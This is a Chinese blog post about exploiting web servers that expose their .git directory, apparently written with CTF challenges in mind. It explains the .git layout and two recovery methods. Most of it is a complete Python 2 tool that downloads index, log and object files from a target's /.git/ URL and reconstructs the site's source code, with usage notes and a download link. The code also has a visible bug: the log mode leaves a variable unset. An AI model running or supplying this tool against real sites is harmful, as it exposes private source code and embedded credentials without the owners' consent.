---
title: git目录泄漏利用工具
date: 2018-01-22 18:42:00
tags: [WEB]
categories: WEB安全
copyright: true
---
## 前言
说找时间写，今天终于动手来写一波有关漏洞利用工具的博文。
git目录泄漏导致了源码泄漏，是一种很严重的过失。说是过失是因为它其实很容易避免。其实在ctf比赛中还是遇到过很多这样的题型，只要能把整个目录中的重要文件下载下来就可以了，那么怎样下载，就是下面要写的了。
## 知识点
要想下载git目录首先要知道这个目录下的文件都有啥含义。
-  hooks:这个目录存放一些shell脚本，可以设置特定的git命令后触发相应的脚本；在搭建gitweb系统或其他git托管系统会经常用到hook script
- info:包含仓库的一些信息
-  logs:保存所有更新的引用记录
-  objects:所有的Git对象都会存放在这个目录中，对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名
-  refs:这个目录一般包括三个子文件夹，heads、remotes和tags，heads中的文件标识了项目中的各个分支指向的当前commit
- COMMIT_EDITMSG:保存最新的commit message，Git系统不会用到这个文件，只是给用户一个参考
- config:这个是GIt仓库的配置文件
- description:仓库的描述信息，主要给gitweb等git托管系统使用
- index:这个文件就是我们前面提到的暂存区（stage），是一个二进制文件
-  HEAD:这个文件包含了一个档期分支（branch）的引用，通过这个文件Git可以得到下一次commit的parent
- ORIG_HEAD:HEAD指针的前一个状态

上面的内容网上很多，可以多了解了解。还有git的基本操作如果都理解的话就可以进行下面的内容了。
## 分析利用方法
其实git目录中是没有源码的明文，也就是说要得到源码，还要使用git命令进行转换的。而且，只要能下载到对象文件就可以了。我有两种想法。
- 一般情况下，在暂存区中记录的对象包含了大部分想要获得的文件，说大部分是因为可能有一部分被删除了。所以只分析index文件可能会漏掉一些。
- 还有一种是分析logs/HEAD文件，这个文件记录了仓库从创建到最后所有的提交记录以及分支变换等等的记录。但是它并不记录`git add .`等的添加命令，也就是说没有提交的对象分析不到。但是它会记录已经删除的文件和不同版本的文件。
鉴于两种方法的互补，可以按照两种方法分别写出程序，在没有头绪之时考虑是否是方法的弊端导致的漏掉文件。
## 源码

```python
# coding:utf-8
# python2
import os,sys
try:
    import requests
except:
    print 'Lost "requests" Module.\nyou can execute "pip install requests" to install this module.'
    exit(1)

class GitHack:
    #params->hosturl: 远程git仓库url，如：http://url/.git/
    #       ->rootdir: 本地会在这个目录建立git版本库
    def __init__(self,hosturl,rootDir='githack'):
        self.host = hosturl.strip('/')+'/'
        self.dir = rootDir

        if not os.path.exists(rootDir):
            os.makedirs(rootDir)
        os.chdir(rootDir)
        os.popen('git init')

    def getFile(self,urlpath):
        '''
        功能：从指定的相对url中获取文件，并存储在本地（使用相同的相对路径）
        参数：urlpath是文件相对于self.host的路径
        注意：本函数会检查目录路径是否存在，只捕获reqeusts.get的异常
        '''
        try:
            r = requests.get(self.host+urlpath)
        except:
            print 'Error!the {} requests failed!'.format(self.host+'.git/'+urlpath)
            return False
        if r.status_code == 404:
            print 'Error!no such file {}'.format(urlpath)
            return False
        a = urlpath.rfind('/')
        if -1 != a:
            if not os.path.exists('.git/'+urlpath[:a]):
                os.makedirs('.git/'+urlpath[:a])
        f = open('.git/'+urlpath,'w')
        f.write(r.content)
        r.close()
        f.close()
        print 'Download file {} ok!'.format(urlpath)
        return True

    def fromIndex(self):
        '''
        功能：还原暂存区的对象
        '''
        self.getFile('index')
        rst = os.popen('git ls-files --stage').readlines()
        queryDic = {}
        sucDic = {}
        for i in rst:
            a = i.find(' ')
            b = i.rfind(' ')
            c = i.rfind('\t')
            queryDic[i[a+1:b]] = i[c+1:-1]
        for f in queryDic:
            if(self.getFile('objects/{}/{}'.format(f[:2],f[2:]))):
                sucDic[f] = queryDic[f]
        return sucDic

    def fromLogs(self):
        '''
        功能：从logs/HEAD文件开始，还原所有对象
        '''
        self.getFile('index')
        self.getFile('logs/HEAD')
        self.getFile('HEAD')
        self.getFile('refs/heads/master')
        logs = []
        queryList = []
        sucDic = {}
        with open('.git/logs/HEAD','r') as f:
            logs = f.readlines()
        for l in logs:
            a = l.find(' ')
            queryList.append(l[a+1:a+1+40])
        for f in queryList:
            if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
                #tree
                s = os.popen('git cat-file -p {}'.format(f)).readlines()[0]
                s = s[5:-1]
                sucDic.update(self.__getTree(s))
        return sucDic

    def __getTree(self,f,prefix=''):
        '''
        功能：递归获取指定tree类型对象下的所有blob对象
        参数：f 是指定对象的sha1值，他应该是tree类型
        prefix 是前一个tree对象对应的目录，它使用来还原文件的原始路径的。类似于 objects/
        
        '''
        sucDic = {}
        if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
            for i in os.popen('git cat-file -p {}'.format(f)).readlines():
                d = i.find(' ')+1
                if 'tree' == i[d:d+4]:
                    a = i.find('tree')+5
                    b = i.rfind('\t')
                    sucDic.update(self.__getTree(i[a:b],prefix+i[b+1:-1]+'/'))
                    continue
                
                a = i.find('blob')+5
                b = i.rfind('\t')
                if self.getFile('objects/{}/{}'.format(i[a:a+2],i[a+2:b])):
                    sucDic[i[a:b]] = prefix+i[b+1:-1]
        return sucDic

    def saveFile(self,sucDic):
        '''
        功能：根据sucDic获取文件的内容,他并不是必要的函数，他只是将所有blob对象还原成文件
        参数：sucDic类似于{'111...1':'1.txt'}键为对象sha1值，值为对应文件名路径
        '''
        for i in sucDic:
            text = os.popen('git cat-file -p {}'.format(i)).read()
            #mkdir
            a = sucDic[i].rfind('/')
            if(-1 != a):
                if not os.path.exists(sucDic[i][:a]):
                    os.makedirs(sucDic[i][:a])
            f = open(sucDic[i],'w')
            f.write(text)
            f.close()
            print 'save file {}.'.format(sucDic[i])

def usage():
    print '''usage:python githack.py hosturl [rootdir] [fromlogs]
                    params：hosturl为包含git目录的url
                            rootdirgit目录会下载到该目录
                            fromlogs可以为任意值即可变为第二个模式。
                    本脚本有两个模式（默认1）：1.下载暂存区的文件。2.从logs中遍历所有对象'''

def main():
    '''
    没怎么处理异常，也没美化命令行，有时间做
    '''
    log = False
    if len(sys.argv)==3:
        rootdir = sys.argv[2]
    elif len(sys.argv)==2:
        rootdir = 'githack'
    elif len(sys.argv)==4:
        log = True
    else:
        usage()
        return
    g = GitHack(sys.argv[1],rootdir)
    if log:
        print 'from Logs mod!'
        sucDic = g.fromLogs()
    else:
        print 'from index mod!'
        sucDic = g.fromIndex()
    #print sucDic
    print ''
    g.saveFile(sucDic)

main()
```
源码也可以到我的码云上下载 [我的githack](https://gitee.com/ktstart/githack "我的githack")
## 总结
这个工具很早之前就有简洁版本，现在重新写了一遍，对git工具的使用和git目录又熟悉了不少。虽然网络上早有此类工具，但自己写出来还是有不少感悟，以后多写多练。